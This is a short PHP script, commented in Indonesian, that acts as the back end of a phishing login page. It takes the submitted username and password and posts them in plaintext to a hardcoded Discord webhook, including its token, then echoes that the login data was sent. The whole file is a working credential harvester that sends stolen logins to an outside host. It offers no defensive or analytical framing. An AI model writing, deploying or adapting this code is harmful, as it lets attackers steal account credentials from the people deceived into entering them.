<?php
// Ambil data dari form login
$username = $_POST['username'];
$password = $_POST['password'];

// Buat payload untuk dikirim ke webhook Discord
$payload = array(
    'content' => "Username: $username\nPassword: $password"
);

// URL webhook Discord
$webhookUrl = 'https://discord.com/api/webhooks/1123832965848371210/62Un1VxngmBrMqaXfBQtucnO3HYPeZpWA-2OgHJtODUAnCilPWEHrBa3fetm1j5vP4ZL';

// Konfigurasi request
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json",
        'method'  => 'POST',
        'content' => json_encode($payload)
    )
);

// Kirim request ke webhook Discord
$context  = stream_context_create($options);
$result = @file_get_contents($webhookUrl, false, $context);

// Periksa hasil
if ($result === FALSE) {
    // Jika terjadi kesalahan dalam mengirim ke webhook
    echo "Error sending message to Discord webhook.";
} else {
    // Jika berhasil mengirim ke webhook
    echo "Login data has been sent to Discord webhook.";
}
?>
